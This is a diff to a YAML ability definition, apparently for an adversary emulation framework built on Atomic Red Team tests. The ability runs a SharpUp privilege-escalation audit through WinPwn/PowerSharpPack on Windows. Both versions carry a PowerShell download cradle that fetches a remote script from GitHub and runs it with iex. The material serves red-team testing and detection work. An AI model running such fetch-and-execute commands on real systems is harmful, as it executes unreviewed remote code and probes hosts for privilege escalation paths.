@@ -1,14 +1,15 @@
-- id: 059d6cc2-6fb1-5a12-bb9f-14092e30e0e8
+- requirements: []
   name: Soumaia ART Tests - WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
   description: PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.
   tactic: discovery
-  technique:
-    attack_id: T1082
-    name: System Information Discovery
-  platforms:
-    windows:
-      psh:
-        command: |-
-          $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
-          Invoke-SharpUp -command "audit"
+  technique_id: T1082
+  technique_name: System Information Discovery
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'); Invoke-SharpUp -command "audit"
+  id: 059d6cc2-6fb1-5a12-bb9f-14092e30e0e8
